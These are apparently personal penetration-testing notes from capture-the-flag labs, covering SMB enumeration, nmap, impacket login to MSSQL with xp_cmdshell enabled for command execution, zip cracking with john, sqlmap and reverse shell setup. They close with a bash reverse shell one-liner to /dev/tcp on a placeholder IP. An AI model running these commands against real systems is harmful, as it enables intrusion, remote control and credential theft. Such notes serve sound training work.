## Tools
### SMB
Server Message Blocks (Port 445) (aka Common Internet File System).

To enumerate:
```bash
smbclient -N -L \\\\{TARGET_IP}\\

-N: no password
-L: look at what services are available
```

To access:
```bash
smbclient -N \\\\{TARGET_IP}\\<folder>
```

When inside, **dir** prints the directories.

To download a file: **get**.

### NMAP
```bash
nmap -p- --min-rate 5000 -sV {TARGET_IP} 
nmap -sC -sV {TARGET_IP}
```

### Impacket
Can be used to connect and authenticate to a MSSQL server for example.

We can try to connect to the MSSQL server by using impacket's `mssqlclient.py` script along with the  
following flags:  
```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

-windows-auth : this flag is specified to use Windows Authentication  
```

Check if I am admin inside MSSQL:
```sql
SELECT is_srvrolemember('sysadmin');
```

To check for `xp_cmdshell`:
```sql
EXEC xp_cmdshell 'net user';
```

To activate `xp_cmdshell`:
```sql
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
sp_configure; - Enabling the sp_configure as stated in the above error message  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE;
```

We can also use the powershell like this:
```bash
xp_cmdshell "powershell -c pwd"
```

Navigation:
```bash
xp_cmdshell "powershell -c cd C:/Users/Public; dir"
```

### BURP
Burp Suite is a powerful security testing application that can be used to perform web requests on web applications, mobile apps, and thick clients. Burp offers multiple capabilities such as web crawler, scanner, proxy, repeater, intruder and many more.  

A web crawler (also known as a web spider or web robot) is a program or automated script which browses the World Wide Web in a methodical, automated manner. This process  
is called Web crawling or spidering. Many legitimate sites, in particular search engines, use spidering as a means of providing up-to-date data.  

If you tunnel web traffic through Burp Suite (without intercepting the packets), by default it can passively spider the website, update the site map with all of the contents requested and thus creating a tree of files and directories without sending any further requests.

### Stable Reverse Shell
```bash
sudo python3 -m http.server 80
```

```bash
sudo nc -lvnp 443
```

- Functional php reverse shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### SUID
Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here.

### Useful Commands
```bash
cat * | grep -i passw*
```

### Crack a ZIP file
Turn into hash:
```bash
zip2john backup.zip > hashes
```

```bash
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

### SQLmap
SQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws. SQLmap automates the process of detecting and exploiting SQL injection. SQL Injection attacks can take control of databases that utilise SQL.

- Command:
```bash
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --  
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"
```

- Good shell:
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
